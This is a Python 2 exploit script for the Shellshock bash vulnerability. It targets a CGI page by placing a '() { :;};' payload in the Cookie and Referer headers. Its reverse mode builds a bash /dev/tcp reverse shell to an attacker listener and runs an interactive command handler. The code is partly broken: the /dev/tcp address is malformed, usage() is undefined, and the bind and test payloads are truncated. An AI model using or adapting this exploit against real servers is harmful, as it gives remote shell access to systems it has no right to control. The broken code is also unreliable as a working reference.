#!/usr/bin/env python

from socket import *
from threading import Thread
import thread, time, httplib, urllib, sys

test_cmd = "/usr/bin/id"

method = 'test'
lhost = '192.168.55.215'
lport = '4444'
rhost = '192.168.55.216'
rport = '4444'
target = '/ss.cgi'
payload = ''

def exploit(lh, lp, rh, rp, pl, p) :
	headers = {"Cookie": pl, "Referer": pl}
	
	print "Trying exploit."
	c = httplib.HTTPConnection(rh)
	c.request("GET",p,headers=headers)
	res = c.getresponse();
	if res.status == 404:
		print "404 on " + target
		sys.exit(0)

if method == 'reverse':
	try:
		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp"+lhost+"/"+str(lport)+" 0>&1 &"
	except:
		usage()
elif method == 'bind':
	try:
		payload = "() { :;}; /bin/bash -c ''"
	except:
		usage()
elif method == 'test':
	payload = "() { :;}; /usr"
else:
	print "unsupported method"
	usage()

if method == 'reverse':
	serversocket = socket(AF_INNET, SOCK_STREAM)
	buff = 1024
	addr = (lhost,int(lport))
	serversocket.bind(addr)
	serversocket.listen(10)
	print "started reverse shell handler"
	thread.start_new_thread(exploit,(lhost, lport, rhost, 0, payload, target,))

if method == 'bind':
	serversocket = socket(AF_INET, SOCK_STREAM)
	addr = (rhost, int(rport))
	thread.start_new_thread(exploit, ("", 0, rhost, rport, payload, target,))

buff = 1024

while True:
	if method == 'reverse':
		clientsocket, clientaddr = serversocket.accept()
		print "reverse bind exploit worked"
		print "incoming connection coming from " + clientaddr[0]
		clientsocket.settimeout(3)
		while True:
			reply = raw_input(clientaddr[0]+"> ")
			clientsocket.sendall(reply+"\n")
			try:
				data = clientsocket.recv(buff)
				print data
			except:
				pass
	if method == 'bind':
		pass
